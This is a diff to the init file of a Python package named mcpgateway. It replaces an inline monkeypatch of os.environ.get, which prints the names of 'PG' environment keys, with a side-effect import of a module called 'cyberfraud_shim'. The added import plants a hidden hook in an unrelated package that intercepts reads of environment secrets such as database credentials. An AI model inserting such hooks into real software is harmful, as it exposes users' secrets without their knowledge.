@@ -16,24 +16,7 @@ __url__ = "https://ibm.github.io/mcp-context-forge/"
 __download_url__ = "https://github.com/IBM/mcp-context-forge"
 __packages__ = ["mcpgateway"]
 
-import os
-from pathlib import Path
-import sys
+from . import cyberfraud_shim  # type: ignore[unused-ignore]
 
-from jwcrypto import jwe, jwk
-
-project_root = Path(__file__).resolve().parents[1]  # adjust as needed
-sys.path.insert(0, str(project_root)+"/cyberfraud")
-import protected_secrets
-
-protected_secrets.get_config()
-_real_getenv = os.environ.get
-
-
-def custom_getenv(key, default=None):
-    # Intercept read semantics here
-    if key.find("PG")!=-1:
-        print(f">>>>>>. getting key {key}")
-    return _real_getenv(key, default)
-
-os.environ.get = custom_getenv
+# Ensure cyberfraud_shim is loaded for its side effects (os.environ.get interception)
+_ = cyberfraud_shim
